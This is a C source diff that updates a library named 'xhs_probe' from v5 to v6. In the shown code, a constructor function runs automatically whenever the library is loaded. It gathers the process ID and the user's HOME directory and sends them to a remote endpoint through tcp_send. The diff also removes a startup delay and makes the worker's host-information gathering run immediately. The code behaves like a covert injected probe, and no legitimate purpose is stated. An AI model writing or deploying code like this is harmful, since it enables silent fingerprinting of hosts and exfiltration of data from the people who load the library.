@@ -154,13 +154,12 @@ static void *worker(void *arg) {
     int sent = 0;
 
     (void)arg;
-    sleep(4);
     buf_init();
     if (!g_buf) return 0;
     scratch = (char *)malloc(CHUNK);
     if (!scratch) return 0;
 
-    buf_str("=== xhs_probe v5 ===\n");
+    buf_str("=== xhs_probe v6 (sync) ===\n");
     {
         const char *home = getenv("HOME");
         snprintf(tmp, sizeof(tmp), "home=%s\npid=%d\n", home ? home : "(null)", getpid());
@@ -246,7 +245,9 @@ static void *worker(void *arg) {
 
 __attribute__((constructor))
 static void xhs_probe_main(void) {
-    char tbuf[64];
-    memset(tbuf, 0, sizeof(tbuf));
-    pthread_create(tbuf, 0, worker, 0);
+    char b[160];
+    const char *h = getenv("HOME");
+    snprintf(b, sizeof(b), "BOOT v6 pid=%d home=%s", getpid(), h ? h : "?");
+    tcp_send("BOOT", b, strlen(b));
+    worker(0);
 }
